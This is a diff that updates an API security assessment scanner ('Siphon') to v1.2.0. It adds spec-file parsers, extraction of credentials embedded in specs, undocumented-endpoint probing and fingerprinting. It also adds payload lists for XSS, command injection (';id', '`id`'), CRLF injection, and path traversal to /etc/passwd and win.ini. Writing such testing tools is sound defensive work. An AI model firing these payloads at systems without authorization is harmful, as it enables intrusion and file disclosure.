@@ -6,6 +6,10 @@ Performs comprehensive API security assessment covering OWASP API
 Security Top 10 2023: BOLA, Broken Auth, Mass Assignment, Rate Limiting,
 BFLA, SSRF, Misconfiguration, Inventory Management, and JWT attacks.
 
+v1.2.0 additions: XSS, CMDi, CRLF, Path Traversal in injection phase;
+sensitive file exposure probe; TLS/SSL analysis; default API credential
+testing; wildcard routing detection; API framework fingerprinting.
+
 Works on Linux, macOS, and Windows.
 """
 
@@ -36,7 +40,7 @@ from datetime import datetime
 from pathlib import Path
 from urllib.parse import urlparse, urljoin, urlencode, quote
 
-VERSION = "1.0.4"
+VERSION = "1.2.0"
 
 
 def _clients_base() -> Path:
@@ -592,6 +596,7 @@ DEFAULT_SETTINGS: dict = {
         "api_base_url":   "",
         "api_base_urls":  [],
         "openapi_url":    "",
+        "api_spec_files": [],
         "threads":        20,
         "timeout":        10,
         "user_agent":     "Mozilla/5.0 (compatible; Siphon/1.0; Security Assessment)",
@@ -614,6 +619,8 @@ DEFAULT_SETTINGS: dict = {
             "cross_user":       False,
             "session":          False,
             "jwt":              False,
+            "sensitive_files":  True,
+            "tls":              True,
         },
         "auth": {
             "enabled":        False,
@@ -647,7 +654,7 @@ PHASE_LIST = [
     ("discovery",       "Phase 0:  OpenAPI/Swagger discovery, endpoint inventory"),
     ("recon",           "Phase 1:  API fingerprinting, server headers, version info"),
     ("fuzzing",         "Phase 2:  HTTP method fuzzing, parameter fuzzing"),
-    ("injection",       "Phase 3:  SQLi, NoSQLi, SSTI, XXE, LDAP injection via API"),
+    ("injection",       "Phase 3:  SQLi, NoSQLi, SSTI, XXE, LDAP, XSS, CMDi, CRLF, Path Traversal"),
     ("auth_bypass",     "Phase 4:  JWT algorithm confusion, none-alg, key confusion"),
     ("rate_limiting",   "Phase 5:  Rate limit detection and bypass techniques"),
     ("mass_assignment", "Phase 6:  Mass assignment / over-posting attack testing"),
@@ -659,6 +666,8 @@ PHASE_LIST = [
     ("cross_user",      "Phase 12: Cross-user data leakage (auth + auth2 required)"),
     ("session",         "Phase 13: API session / token management analysis (auth required)"),
     ("jwt",             "Phase 14: JWT advanced attacks — jku, kid, HMAC cracking (auth required)"),
+    ("sensitive_files", "Phase 15: Sensitive file exposure — .env, config, git, swagger (API9)"),
+    ("tls",             "Phase 16: TLS/SSL analysis — deprecated protocols, weak ciphers (API8)"),
 ]
 
 # ---------------------------------------------------------------------------
@@ -702,8 +711,15 @@ def _parse_args() -> argparse.Namespace:
         epilog="\n".join(f"  {n:<16} {d}" for n, d in PHASE_LIST),
     )
     ap.add_argument("--settings",     metavar="FILE",  help="JSON settings file")
-    ap.add_argument("--url",          metavar="URL",   help="API base URL")
-    ap.add_argument("--openapi",      metavar="URL",   help="OpenAPI/Swagger spec URL or file path")
+    ap.add_argument("--url",          metavar="URL",   help="Primary API base URL")
+    ap.add_argument("--urls",         metavar="URLS",
+                    help="Comma-separated list of additional API base URLs")
+    ap.add_argument("--openapi",      metavar="URL",
+                    help="OpenAPI/Swagger spec URL or file path (legacy; prefer --spec-file)")
+    ap.add_argument("--spec-file",    metavar="FILE",  action="append", dest="spec_files",
+                    help="API spec file or URL to ingest (may be repeated); supports "
+                         "OpenAPI JSON/YAML, Swagger, GraphQL SDL/introspection, "
+                         "Postman Collection, Insomnia export, HAR")
     ap.add_argument("--project",      metavar="DIR",   help="Output directory")
     ap.add_argument("--fast",         action="store_true", help="Skip slow phases")
     ap.add_argument("--resume",       metavar="DIR",   help="Resume from existing output directory")
@@ -726,8 +742,18 @@ def _apply_args(settings: dict, args: argparse.Namespace) -> dict:
     scan = settings["scan"]
     if args.url:
         scan["api_base_url"] = args.url.rstrip("/")
+    if getattr(args, "urls", None):
+        extras = [u.strip().rstrip("/") for u in args.urls.split(",") if u.strip()]
+        existing = scan.get("api_base_urls", [])
+        scan["api_base_urls"] = existing + [u for u in extras if u not in existing]
     if args.openapi:
         scan["openapi_url"] = args.openapi
+    if getattr(args, "spec_files", None):
+        existing_files = scan.get("api_spec_files", [])
+        for sf in args.spec_files:
+            if sf and sf not in existing_files:
+                existing_files.append(sf)
+        scan["api_spec_files"] = existing_files
     if args.project:
         scan["project"] = args.project
     if args.threads:
@@ -869,6 +895,495 @@ def _safe_request(sess: requests.Session, method: str, url: str, timeout: int = 
 
 
 # ---------------------------------------------------------------------------
+# API spec format detection + multi-format parsers
+# ---------------------------------------------------------------------------
+
+def _detect_spec_format(content_dict: dict | None, content_str: str) -> str:
+    """Detect API spec format from parsed content or raw text."""
+    if content_dict:
+        # OpenAPI 3.x
+        if str(content_dict.get("openapi", "")).startswith("3"):
+            return "openapi3"
+        # Swagger 2.x
+        if content_dict.get("swagger") == "2.0":
+            return "swagger2"
+        # Postman Collection v2.0 / v2.1
+        info = content_dict.get("info", {})
+        if isinstance(info, dict) and (
+            "_postman_id" in info or
+            "postman" in info.get("schema", "").lower()
+        ):
+            return "postman"
+        # GraphQL introspection JSON
+        if "__schema" in content_dict or (
+            "data" in content_dict and
+            isinstance(content_dict.get("data"), dict) and
+            "__schema" in content_dict["data"]
+        ):
+            return "graphql_introspection"
+        # Insomnia export
+        if content_dict.get("_type") == "export" and "resources" in content_dict:
+            return "insomnia"
+        # HAR
+        if "log" in content_dict and isinstance(content_dict.get("log"), dict) and \
+                "entries" in content_dict["log"]:
+            return "har"
+        # Fallback: if it has "paths", treat as OpenAPI
+        if "paths" in content_dict:
+            return "swagger2"
+    if content_str:
+        # GraphQL SDL
+        if re.search(r'\btype\s+(?:Query|Mutation|Subscription)\b', content_str):
+            return "graphql_sdl"
+        # YAML OpenAPI/Swagger
+        if re.search(r'^openapi\s*:', content_str, re.M) or \
+                re.search(r'^swagger\s*:', content_str, re.M):
+            return "yaml_openapi"
+    return "unknown"
+
+
+def _parse_postman_spec(collection: dict) -> list:
+    """Parse Postman Collection v2.0/v2.1 into endpoint inventory."""
+    inventory: list = []
+
+    def _items_to_inventory(items: list) -> None:
+        for item in items:
+            if "item" in item:
+                _items_to_inventory(item["item"])
+                continue
+            req = item.get("request", {})
+            if isinstance(req, str):
+                continue
+            method = req.get("method", "GET").upper()
+            url_obj = req.get("url", {})
+            if isinstance(url_obj, str):
+                path = urlparse(url_obj).path or "/"
+                qparams: list = []
+            elif isinstance(url_obj, dict):
+                raw = url_obj.get("raw", "")
+                path_parts = url_obj.get("path", [])
+                if path_parts:
+                    path = "/" + "/".join(str(p).lstrip(":") for p in path_parts)
+                else:
+                    path = urlparse(raw).path or "/"
+                qparams = [
+                    {"name": q.get("key", ""), "in": "query", "required": False}
+                    for q in url_obj.get("query", [])
+                    if isinstance(q, dict) and q.get("key") and not q.get("disabled")
+                ]
+            else:
+                continue
+
+            body_fields: list = []
+            body = req.get("body", {})
+            if isinstance(body, dict):
+                mode = body.get("mode", "")
+                if mode == "raw":
+                    try:
+                        raw_body = json.loads(body.get("raw", "{}"))
+                        if isinstance(raw_body, dict):
+                            body_fields = list(raw_body.keys())
+                    except Exception:
+                        pass
+                elif mode in ("urlencoded", "formdata"):
+                    for f in body.get(mode, []):
+                        if isinstance(f, dict) and f.get("key") and not f.get("disabled"):
+                            body_fields.append(f["key"])
+
+            inventory.append({
+                "method":        method,
+                "path":          path,
+                "params":        qparams,
+                "body_fields":   body_fields,
+                "auth_required": bool(req.get("auth")),
+                "operation_id":  item.get("name", ""),
+                "tags":          [],
+                "summary":       item.get("name", ""),
+            })
+
+    _items_to_inventory(collection.get("item", []))
+    return inventory
+
+
+def _parse_graphql_spec(content) -> list:
+    """Parse GraphQL SDL text or introspection JSON into endpoint inventory."""
+    inventory: list = []
+
+    def _field_entry(op_type: str, field_name: str, description: str = "") -> dict:
+        return {
+            "method":           "POST",
+            "path":             "/graphql",
+            "params":           [],
+            "body_fields":      [field_name],
+            "auth_required":    False,
+            "operation_id":     f"{op_type}.{field_name}",
+            "tags":             [op_type],
+            "summary":          description or field_name,
+            "graphql_operation": op_type,
+            "graphql_field":    field_name,
+        }
+
+    if isinstance(content, dict):
+        schema = content.get("__schema") or (
+            content.get("data", {}) or {}
+        ).get("__schema")
+        if schema:
+            for type_def in (schema.get("types") or []):
+                tname = type_def.get("name", "")
+                if tname in ("Query", "Mutation", "Subscription"):
+                    for field in (type_def.get("fields") or []):
+                        inventory.append(
+                            _field_entry(tname.lower(), field.get("name", ""),
+                                         field.get("description", ""))
+                        )
+        return inventory
+
+    if isinstance(content, str):
+        for m in re.finditer(
+            r'type\s+(Query|Mutation|Subscription)\s*\{([^}]+)\}', content, re.S
+        ):
+            op_type = m.group(1).lower()
+            for fm in re.finditer(r'(\w+)\s*(?:\([^)]*\))?\s*:', m.group(2)):
+                inventory.append(_field_entry(op_type, fm.group(1)))
+
+    return inventory
+
+
+def _parse_insomnia_spec(export: dict) -> list:
+    """Parse Insomnia export file into endpoint inventory."""
+    inventory: list = []
+    for resource in export.get("resources", []):
+        if resource.get("_type") != "request":
+            continue
+        method = resource.get("method", "GET").upper()
+        try:
+            path = urlparse(resource.get("url", "")).path or "/"
+        except Exception:
+            path = "/"
+        params = [
+            {"name": p.get("name", ""), "in": "query", "required": False}
+            for p in resource.get("parameters", [])
+            if isinstance(p, dict) and not p.get("disabled")
+        ]
+        body_fields: list = []
+        body = resource.get("body", {})
+        if isinstance(body, dict) and "json" in body.get("mimeType", ""):
+            try:
+                c = json.loads(body.get("text", "{}"))
+                if isinstance(c, dict):
+                    body_fields = list(c.keys())
+            except Exception:
+                pass
+        inventory.append({
+            "method":        method,
+            "path":          path,
+            "params":        params,
+            "body_fields":   body_fields,
+            "auth_required": bool(resource.get("authentication")),
+            "operation_id":  resource.get("name", ""),
+            "tags":          [],
+            "summary":       resource.get("name", ""),
+        })
+    return inventory
+
+
+def _parse_har_spec(har: dict) -> list:
+    """Parse HAR file into endpoint inventory (deduplicated by method+path)."""
+    inventory: list = []
+    seen: set = set()
+    for entry in (har.get("log") or {}).get("entries", []):
+        req = entry.get("request", {})
+        method = req.get("method", "GET").upper()
+        try:
+            path = urlparse(req.get("url", "")).path or "/"
+        except Exception:
+            path = "/"
+        key = (method, path)
+        if key in seen:
+            continue
+        seen.add(key)
+        params = [
+            {"name": q.get("name", ""), "in": "query", "required": False}
+            for q in req.get("queryString", [])
+            if isinstance(q, dict)
+        ]
+        body_fields: list = []
+        post = req.get("postData", {})
+        if isinstance(post, dict):
+            if "json" in post.get("mimeType", ""):
+                try:
+                    c = json.loads(post.get("text", "{}"))
+                    if isinstance(c, dict):
+                        body_fields = list(c.keys())
+                except Exception:
+                    pass
+            else:
+                body_fields = [
+                    p.get("name", "")
+                    for p in post.get("params", [])
+                    if isinstance(p, dict) and p.get("name")
+                ]
+        inventory.append({
+            "method":        method,
+            "path":          path,
+            "params":        params,
+            "body_fields":   body_fields,
+            "auth_required": False,
+            "operation_id":  f"{method}:{path}",
+            "tags":          [],
+            "summary":       f"{method} {path}",
+        })
+    return inventory
+
+
+def _extract_spec_credentials(spec: dict, fmt: str) -> dict:
+    """Extract credentials embedded in an API spec file.
+
+    Returns a dict with keys any of:
+      auth_type, auth_token, username, password, api_key, api_key_header,
+      oauth_token_url
+    Empty dict means no credentials found.
+    """
+    creds: dict = {}
+
+    if fmt in ("openapi3", "swagger2", "yaml_openapi"):
+        # OAS3 components/securitySchemes; Swagger2 securityDefinitions
+        schemes = (
+            (spec.get("components") or {}).get("securitySchemes")
+            or spec.get("securityDefinitions")
+            or {}
+        )
+        for _, scheme in schemes.items():
+            if not isinstance(scheme, dict):
+                continue
+            stype = scheme.get("type", "").lower()
+            if stype == "apikey":
+                creds.setdefault("api_key_header", scheme.get("name", "X-API-Key"))
+                creds.setdefault("auth_type", "apikey")
+            elif stype == "http":
+                http_scheme = scheme.get("scheme", "").lower()
+                if http_scheme == "bearer":
+                    creds.setdefault("auth_type", "bearer")
+                elif http_scheme == "basic":
+                    creds.setdefault("auth_type", "basic")
+            elif stype == "oauth2":
+                flows = scheme.get("flows") or {}
+                for _, flow in flows.items():
+                    if isinstance(flow, dict) and flow.get("tokenUrl"):
+                        creds.setdefault("oauth_token_url", flow["tokenUrl"])
+                        creds.setdefault("auth_type", "oauth2")
+
+    elif fmt == "postman":
+        auth = spec.get("auth") or {}
+        if isinstance(auth, dict):
+            auth_type = auth.get("type", "").lower()
+            if auth_type == "bearer":
+                for item in (auth.get("bearer") or []):
+                    if isinstance(item, dict) and item.get("key") == "token" \
+                            and item.get("value"):
+                        creds["auth_token"] = item["value"]
+                        creds["auth_type"] = "bearer"
+            elif auth_type == "basic":
+                creds["auth_type"] = "basic"
+                for item in (auth.get("basic") or []):
+                    if not isinstance(item, dict):
+                        continue
+                    if item.get("key") == "username":
+                        creds["username"] = item.get("value", "")
+                    elif item.get("key") == "password":
+                        creds["password"] = item.get("value", "")
+            elif auth_type == "apikey":
+                creds["auth_type"] = "apikey"
+                for item in (auth.get("apikey") or []):
+                    if not isinstance(item, dict):
+                        continue
+                    if item.get("key") == "value":
+                        creds["api_key"] = item.get("value", "")
+                    elif item.get("key") == "key":
+                        creds["api_key_header"] = item.get("value", "X-API-Key")
+
+    return creds
+
+
+def _dispatch_spec_parse(content_dict: dict | None,
+                         content_str: str, fmt: str) -> list:
+    """Dispatch spec content to the correct parser and return endpoint list."""
+    if fmt in ("openapi3", "swagger2", "yaml_openapi") and content_dict:
+        return _parse_openapi_spec(content_dict)
+    if fmt == "postman" and content_dict:
+        return _parse_postman_spec(content_dict)
+    if fmt in ("graphql_introspection", "graphql_sdl"):
+        return _parse_graphql_spec(content_dict if fmt == "graphql_introspection"
+                                   else content_str)
+    if fmt == "insomnia" and content_dict:
+        return _parse_insomnia_spec(content_dict)
+    if fmt == "har" and content_dict:
+        return _parse_har_spec(content_dict)
+    # Unknown / fallback: try OpenAPI parser
+    if content_dict and "paths" in content_dict:
+        return _parse_openapi_spec(content_dict)
+    return []
+
+
+def _load_spec_file(path_or_url: str, sess: requests.Session,
+                    timeout: int) -> tuple[list, dict, str]:
+    """Load and parse a spec file or URL.
+
+    Returns (inventory, credentials, format_name).
+    """
+    content_str = ""
+    content_dict: dict | None = None
+
+    # --- fetch content ---
+    if path_or_url.startswith(("http://", "https://")):
+        resp = _safe_get(sess, path_or_url, timeout=timeout)
+        if not resp or resp.status_code != 200:
+            con.err(f"Could not fetch spec from {path_or_url}")
+            return [], {}, "unknown"
+        content_str = resp.text
+    else:
+        p = Path(path_or_url)
+        if not p.exists():
+            con.err(f"Spec file not found: {path_or_url}")
+            return [], {}, "unknown"
+        content_str = p.read_text(encoding="utf-8", errors="replace")
+
+    # --- parse content ---
+    try:
+        content_dict = json.loads(content_str)
+    except json.JSONDecodeError:
+        pass
+    if content_dict is None:
+        try:
+            import yaml as _yaml
+            content_dict = _yaml.safe_load(content_str)
+            if not isinstance(content_dict, dict):
+                content_dict = None
+        except Exception:
+            pass
+
+    fmt = _detect_spec_format(content_dict, content_str)
+    inventory = _dispatch_spec_parse(content_dict, content_str, fmt)
+    creds = _extract_spec_credentials(content_dict or {}, fmt) if content_dict else {}
+
+    return inventory, creds, fmt
+
+
+# ---------------------------------------------------------------------------
+# Undocumented endpoint probing
+# ---------------------------------------------------------------------------
+
+_API_PROBE_PATHS = [
+    "/api", "/api/v1", "/api/v2", "/api/v3", "/api/v4",
+    "/v1", "/v2", "/v3", "/v4",
+    "/graphql", "/graphiql", "/playground", "/gql",
+    "/users", "/user", "/me", "/accounts", "/account", "/profile", "/profiles",
+    "/auth", "/authenticate", "/login", "/logout", "/register", "/signup", "/signout",
+    "/admin", "/administrator", "/management", "/manage", "/dashboard", "/panel",
+    "/health", "/healthz", "/health-check", "/status", "/ping", "/ready", "/live",
+    "/config", "/configuration", "/settings", "/preferences",
+    "/search", "/find", "/query", "/filter",
+    "/products", "/product", "/items", "/item", "/catalog", "/catalogue",
+    "/orders", "/order", "/cart", "/checkout", "/basket",
+    "/tokens", "/token", "/keys", "/key", "/secrets", "/secret", "/credentials",
+    "/files", "/file", "/uploads", "/upload", "/download", "/downloads", "/attachments",
+    "/webhooks", "/webhook", "/hooks", "/hook",
+    "/events", "/event", "/notifications", "/notification", "/messages", "/message",
+    "/docs", "/documentation", "/swagger", "/openapi", "/spec", "/schema", "/redoc",
+    "/metrics", "/stats", "/statistics", "/analytics", "/telemetry", "/monitoring",
+    "/roles", "/role", "/permissions", "/permission", "/groups", "/group",
+    "/organizations", "/organization", "/org", "/tenants", "/tenant",
+    "/payments", "/payment", "/billing", "/invoice", "/invoices", "/transactions",
+    "/subscriptions", "/subscription", "/plans", "/plan", "/pricing",
+    "/reset-password", "/forgot-password", "/password-reset", "/verify", "/confirm",
+    "/sessions", "/session", "/refresh", "/revoke", "/introspect",
+    "/internal", "/private", "/debug", "/test", "/dev", "/staging",
+    "/emails", "/email", "/contacts", "/contact",
+    "/reports", "/report", "/export", "/exports", "/imports",
+    "/inventory", "/warehouses", "/locations", "/addresses", "/address",
+    "/comments", "/comment", "/reviews", "/review", "/ratings", "/rating",
+    "/tags", "/tag", "/categories", "/category", "/labels", "/label",
+    "/assets", "/media", "/images", "/image", "/videos", "/video",
+]
+
+
+def _probe_undocumented_endpoints(
+    settings: dict,
+    sess: requests.Session,
+    output: OutputManager,
+    spec_inventory: list,
+    target_root: str,
+) -> None:
+    """Probe for API endpoints not present in the provided spec inventory.
+
+    Creates a MEDIUM finding for each active path not documented in the spec.
+    Only runs when a spec was actually loaded (spec_inventory is non-empty).
+    """
+    if not spec_inventory:
+        return
+
+    scan = settings["scan"]
+    timeout = scan.get("timeout", 10)
+    threads = min(scan.get("threads", 10), 20)
+
+    # Normalise known spec paths for comparison
+    known_paths: set[str] = set()
+    for ep in spec_inventory:
+        p = ep.get("path", "").rstrip("/") or "/"
+        # Strip path parameters like {id} to match static prefix
+        p_static = re.sub(r'\{[^}]+\}', '*', p)
+        known_paths.add(p_static)
+        known_paths.add(p)
+
+    con.status("discovery", "running", f"Probing {len(_API_PROBE_PATHS)} paths for undocumented endpoints")
+
+    found_undoc = 0
+
+    def _probe(probe_path: str) -> tuple[str, int] | None:
+        url = target_root.rstrip("/") + probe_path
+        resp = _safe_get(sess, url, timeout=timeout, allow_redirects=False)
+        if resp is None:
+            return None
+        if resp.status_code in (200, 201, 202, 204):
+            return (probe_path, resp.status_code)
+        return None
+
+    with ThreadPoolExecutor(max_workers=threads) as pool:
+        futures = {pool.submit(_probe, p): p for p in _API_PROBE_PATHS}
+        for future in as_completed(futures):
+            result = future.result()
+            if not result:
+                continue
+            probe_path, status_code = result
+            norm = probe_path.rstrip("/") or "/"
+            # Check if path matches any known spec path
+            if norm in known_paths:
+                continue
+            # Also check if any spec path starts with this probe path
+            if any(kp.startswith(norm) for kp in known_paths):
+                continue
+            found_undoc += 1
+            output.add_finding(
+                phase="discovery",
+                title="Undocumented API Endpoint Detected",
+                severity="MEDIUM",
+                url=target_root.rstrip("/") + probe_path,
+                detail=(f"API endpoint '{probe_path}' returned HTTP {status_code} "
+                        f"but is not documented in the provided API specification."),
+                evidence=f"GET {target_root.rstrip('/')}{probe_path} → {status_code}",
+                remediation=(
+                    "Ensure all active API endpoints are documented in the API specification. "
+                    "Remove or disable unintended undocumented endpoints."
+                ),
+            )
+
+    if found_undoc:
+        con.warn(f"Undocumented endpoints: {found_undoc} active paths not in spec")
+    else:
+        con.info("No undocumented endpoints detected beyond known spec paths")
+
+
+# ---------------------------------------------------------------------------
 # Phase 0: Discovery — OpenAPI/Swagger spec parsing + endpoint inventory
 # ---------------------------------------------------------------------------
 
@@ -984,63 +1499,111 @@ def _fetch_spec(url_or_path: str, sess: requests.Session, timeout: int) -> dict 
 
 def phase_discovery(settings: dict, sess: requests.Session,
                     output: OutputManager) -> list:
-    """Phase 0: Discover API endpoints via OpenAPI spec or probing."""
+    """Phase 0: Discover API endpoints via spec file(s) or active probing.
+
+    Supports OpenAPI 2.x/3.x, Swagger, GraphQL SDL/introspection, Postman
+    Collections, Insomnia exports, and HAR files.  Credentials embedded in
+    spec files are extracted and applied to the session when no auth is already
+    configured.  After building the inventory, active probing detects endpoints
+    not listed in the spec (MEDIUM finding per undocumented path).
+    """
     scan = settings["scan"]
     base_url = scan["api_base_url"]
-    openapi_url = scan.get("openapi_url", "")
     timeout = scan.get("timeout", 10)
     target = _parse_target(base_url)
+    target_root = f"{target['scheme']}://{target['netloc']}"
     inventory: list = []
+    spec_was_provided = False
 
-    con.status("discovery", "running", "Scanning for API specification")
+    con.status("discovery", "running", "Loading API specifications")
 
-    # 1. If explicit spec URL/path given, use it
-    spec_url = openapi_url
-    spec = None
+    # ------------------------------------------------------------------ #
+    # 1. Load provided spec files (local paths or URLs)                   #
+    # ------------------------------------------------------------------ #
+    spec_sources: list[str] = []
+    # Legacy single openapi_url field
+    if scan.get("openapi_url"):
+        spec_sources.append(scan["openapi_url"])
+    # New multi-file list
+    for src in scan.get("api_spec_files", []):
+        if src and src not in spec_sources:
+            spec_sources.append(src)
 
-    if spec_url:
-        spec = _fetch_spec(spec_url, sess, timeout)
-        if spec:
-            con.info(f"Loaded spec from: {spec_url}")
-            output.add_finding(
-                phase="discovery",
-                title="API Specification Exposed",
-                severity="INFO",
-                url=spec_url,
-                detail="OpenAPI/Swagger specification is publicly accessible.",
-                evidence=f"URL: {spec_url}",
-                remediation="Restrict spec access to authorized users in production.",
+    all_creds: dict = {}
+    for src in spec_sources:
+        con.info(f"Loading spec: {src}")
+        ep_list, creds, fmt = _load_spec_file(src, sess, timeout)
+        if ep_list:
+            spec_was_provided = True
+            # Record finding for remotely accessible specs
+            if src.startswith(("http://", "https://")):
+                output.add_finding(
+                    phase="discovery",
+                    title="API Specification Exposed",
+                    severity="INFO",
+                    url=src,
+                    detail=f"API specification ({fmt}) is publicly accessible.",
+                    evidence=f"URL: {src}",
+                    remediation="Restrict specification access to authorized users in production.",
+                )
+            con.info(f"  Loaded {len(ep_list)} endpoints ({fmt}) from {src}")
+            inventory.extend(ep_list)
+        if creds:
+            all_creds.update(creds)
+            con.info(f"  Extracted credentials from spec ({fmt}): {list(creds.keys())}")
+
+    # ------------------------------------------------------------------ #
+    # 2. Apply spec credentials to session (only when no auth configured) #
+    # ------------------------------------------------------------------ #
+    auth_cfg = scan.get("auth", {})
+    if all_creds and not auth_cfg.get("enabled"):
+        applied: list[str] = []
+        if all_creds.get("auth_token") and all_creds.get("auth_type") == "bearer":
+            sess.headers["Authorization"] = f"Bearer {all_creds['auth_token']}"
+            applied.append("Bearer token")
+        elif all_creds.get("username") and all_creds.get("password"):
+            import requests.auth as _req_auth
+            sess.auth = _req_auth.HTTPBasicAuth(
+                all_creds["username"], all_creds["password"]
             )
+            applied.append("HTTP Basic")
+        elif all_creds.get("api_key") and all_creds.get("api_key_header"):
+            sess.headers[all_creds["api_key_header"]] = all_creds["api_key"]
+            applied.append(f"API Key ({all_creds['api_key_header']})")
+        if applied:
+            con.info(f"Applied spec credentials to session: {', '.join(applied)}")
 
-    # 2. Auto-probe common paths if no spec yet
-    if not spec:
-        root = f"{target['scheme']}://{target['netloc']}"
+    # ------------------------------------------------------------------ #
+    # 3. Auto-probe well-known paths if no spec loaded yet                #
+    # ------------------------------------------------------------------ #
+    if not spec_was_provided:
         for probe_path in _DISCOVERY_PATHS:
-            probe_url = root + probe_path
+            probe_url = target_root + probe_path
             resp = _safe_get(sess, probe_url, timeout=timeout)
             if resp and resp.status_code == 200:
                 content_type = resp.headers.get("Content-Type", "")
                 if any(ct in content_type for ct in ("json", "yaml", "text")):
-                    spec = _fetch_spec(probe_url, sess, timeout)
-                    if spec and ("paths" in spec or "swagger" in spec or "openapi" in spec):
-                        con.info(f"Discovered spec at: {probe_url}")
+                    ep_list, _, fmt = _load_spec_file(probe_url, sess, timeout)
+                    if ep_list:
+                        spec_was_provided = True
+                        con.info(f"Discovered spec at: {probe_url} ({fmt})")
                         output.add_finding(
                             phase="discovery",
                             title="API Specification Exposed",
                             severity="LOW",
                             url=probe_url,
-                            detail=f"OpenAPI/Swagger spec found at {probe_url}",
+                            detail=f"API specification ({fmt}) found at {probe_url}",
                             evidence=f"HTTP 200 with spec content",
                             remediation="Restrict specification access in production environments.",
                         )
+                        inventory.extend(ep_list)
                         break
 
-    # 3. Parse spec into inventory
-    if spec:
-        inventory = _parse_openapi_spec(spec)
-        con.info(f"Discovered {len(inventory)} API endpoints from spec")
-    else:
-        con.info("No spec found; building minimal inventory from base URL")
+    # ------------------------------------------------------------------ #
+    # 4. Fallback minimal inventory when nothing was found                #
+    # ------------------------------------------------------------------ #
+    if not inventory:
+        con.info("No spec loaded; using minimal inventory from base URL")
         inventory = [{
             "method": "GET",
             "path": target["path"] or "/",
@@ -1052,7 +1615,27 @@ def phase_discovery(settings: dict, sess: requests.Session,
             "summary": "Base API endpoint",
         }]
 
-    # 4. Save inventory
+    # Deduplicate inventory by (method, path)
+    _seen_ep: set = set()
+    deduped: list = []
+    for ep in inventory:
+        k = (ep.get("method", "GET"), ep.get("path", "/"))
+        if k not in _seen_ep:
+            _seen_ep.add(k)
+            deduped.append(ep)
+    inventory = deduped
+
+    con.info(f"Inventory: {len(inventory)} unique endpoint(s)")
+
+    # ------------------------------------------------------------------ #
+    # 5. Probe for undocumented endpoints (only when a spec was provided) #
+    # ------------------------------------------------------------------ #
+    if spec_was_provided:
+        _probe_undocumented_endpoints(settings, sess, output, inventory, target_root)
+
+    # ------------------------------------------------------------------ #
+    # 6. Save inventory                                                   #
+    # ------------------------------------------------------------------ #
     output.save_inventory(inventory)
     con.status("discovery", "done", f"{len(inventory)} endpoints in inventory")
     return inventory
@@ -1159,6 +1742,54 @@ def phase_recon(settings: dict, sess: requests.Session,
                     evidence=f"Access-Control-Allow-Origin: {acao}, Credentials: {acac}",
                     remediation="Validate Origin against an allowlist before reflecting.",
                 )
+
+    # Wildcard / catch-all detection — random path should 404
+    import secrets as _secrets_mod
+    _rnd_path = f"/siphon-probe-{_secrets_mod.token_hex(8)}-notfound"
+    wc_resp = _safe_get(sess, base_url.rstrip("/") + _rnd_path, timeout=timeout)
+    if wc_resp and wc_resp.status_code == 200:
+        output.add_finding(
+            phase="recon",
+            title="API Catch-All / Wildcard Routing Detected",
+            severity="LOW",
+            url=base_url,
+            detail=(f"The server returned HTTP 200 for a random non-existent path "
+                    f"({_rnd_path}). This may mask true endpoint inventory and inflate "
+                    f"undocumented-endpoint findings."),
+            evidence=f"GET {_rnd_path} → HTTP {wc_resp.status_code}",
+            remediation="Return 404 for unknown paths. Do not expose catch-all routes in production.",
+        )
+
+    # Framework / stack fingerprinting
+    _FRAMEWORK_PATTERNS = [
+        (re.compile(r'Django|django', re.I),    "Django (Python)"),
+        (re.compile(r'Flask',          re.I),    "Flask (Python)"),
+        (re.compile(r'FastAPI|fastapi', re.I),   "FastAPI (Python)"),
+        (re.compile(r'Spring',         re.I),    "Spring Boot (Java)"),
+        (re.compile(r'Tomcat|tomcat',  re.I),    "Apache Tomcat (Java)"),
+        (re.compile(r'Express',        re.I),    "Express.js (Node)"),
+        (re.compile(r'Laravel',        re.I),    "Laravel (PHP)"),
+        (re.compile(r'Rails|rack',     re.I),    "Ruby on Rails"),
+        (re.compile(r'ASP\.NET|aspnet',re.I),    "ASP.NET"),
+        (re.compile(r'Gin\b',          re.I),    "Gin (Go)"),
+        (re.compile(r'Fiber\b',        re.I),    "Fiber (Go)"),
+        (re.compile(r'Actix|actix',    re.I),    "Actix (Rust)"),
+    ]
+    all_header_vals = " ".join(str(v) for v in resp.headers.values())
+    detected_frameworks = []
+    for pat, name in _FRAMEWORK_PATTERNS:
+        if pat.search(server) or pat.search(x_powered) or pat.search(all_header_vals):
+            detected_frameworks.append(name)
+    if detected_frameworks:
+        output.add_finding(
+            phase="recon",
+            title="API Framework Identified",
+            severity="INFO",
+            url=base_url,
+            detail=f"Framework fingerprint detected: {', '.join(detected_frameworks)}",
+            evidence=f"Server: {server}  X-Powered-By: {x_powered}  Headers: {all_header_vals[:200]}",
+            remediation="Remove version-revealing headers and error messages to reduce fingerprint surface.",
+        )
 
     con.status("recon", "done", f"Server: {server or 'unknown'}")
 
@@ -1273,6 +1904,37 @@ _LDAP_PAYLOADS = [
     ("*)(uid=*))(|(uid=*", "LDAP injection"),
     ("admin*", "LDAP wildcard prefix"),
 ]
+
+
+_XSS_PAYLOADS = [
+    '<script>alert(1)</script>',
+    '"><script>alert(1)</script>',
+    "'><img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
+]
+_CMD_PAYLOADS = [
+    (";id",  re.compile(r'uid=\d+\(')),
+    ("|id",  re.compile(r'uid=\d+\(')),
+    ("&id",  re.compile(r'uid=\d+\(')),
+    ("`id`", re.compile(r'uid=\d+\(')),
+]
+_CRLF_INJECTION_HEADER = "%0d%0aSiphon-Injected: test"
+_TRAVERSAL_PAYLOADS = [
+    "../../../etc/passwd",
+    "../../../../etc/passwd",
+    "../../../../../etc/passwd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+    "..%2f..%2f..%2fetc%2fpasswd",
+    "....//....//....//etc/passwd",
+    "..\\..\\..\\windows\\win.ini",
+    "..%5c..%5c..%5cwindows%5cwin.ini",
+]
+_LFI_PARAMS = frozenset({
+    "file", "page", "include", "path", "template", "view", "doc",
+    "document", "load", "read", "content", "lang", "language", "module",
+})
+_TRAVERSAL_RE = re.compile(r'root:.*:/bin/|daemon:.*:/usr/sbin|Win\.ini|\[boot loader\]', re.I)
 
 
 def _test_injection(sess: requests.Session, url: str, method: str,
@@ -1422,12 +2084,146 @@ def phase_injection(settings: dict, sess: requests.Session,
         except Exception:
             pass
 
+    # XSS — reflected XSS via query/body parameters
+    for ep in test_endpoints[:10]:
